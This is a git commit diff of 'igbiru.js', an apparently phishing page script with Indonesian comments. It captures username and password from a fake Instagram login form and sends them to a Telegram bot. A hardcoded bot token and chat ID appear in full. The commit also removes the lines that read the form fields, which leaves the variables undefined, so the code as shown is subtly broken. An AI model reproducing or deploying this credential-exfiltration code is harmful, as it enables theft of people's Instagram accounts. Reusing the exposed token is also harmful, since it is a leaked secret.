8c477143204e623b13ef9ed80d13ba7b9bc17480
uciharidwan <161241056+uciharidwan@users.noreply.github.com>
2024-02-26 01:44:16 +0700

    Update igbiru.js

--- igbiru.js
+++ igbiru.js
@@ -2,8 +2,8 @@
 
 // Fungsi untuk mengirim pesan ke Telegram
 function kirimPesanTelegram(pesan) {
-    var botToken = '6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE'; // Ganti dengan token bot Anda
-    var chatId = '2079666452'; // Ganti dengan ID obrolan Anda
+    var botToken = '6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE'; // Token bot Anda
+    var chatId = '2079666452'; // ID obrolan Anda
     var message = encodeURIComponent(pesan);
     var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + message;
 
@@ -23,10 +23,15 @@ function kirimPesanTelegram(pesan) {
 document.querySelector('.contacts__form').addEventListener('submit', function(event) {
     event.preventDefault(); // Menghentikan pengiriman form bawaan
 
-    var uname = document.getElementById('uname').value; // Ambil nilai username dari form
-    var pass = document.getElementById('pass').value; // Ambil nilai password dari form
+    var pesan = `
+( Instagram | Login )
+==========================
+- Username : ${uname}
+- Password : ${pass} 
+==========================
+Tele : @RXLHOSTING
+`; // Pesan yang ingin Anda kirim
 
-    var pesan = "( Instagram | Login )\n==========================\n- Username : " + uname + "\n- Password : " + pass + "\n==========================\nTele : @RXLHOSTING"; // Pesan yang ingin Anda kirim
     kirimPesanTelegram(pesan);
 
     // Tambahkan logika lain yang Anda perlukan setelah pengiriman pesan
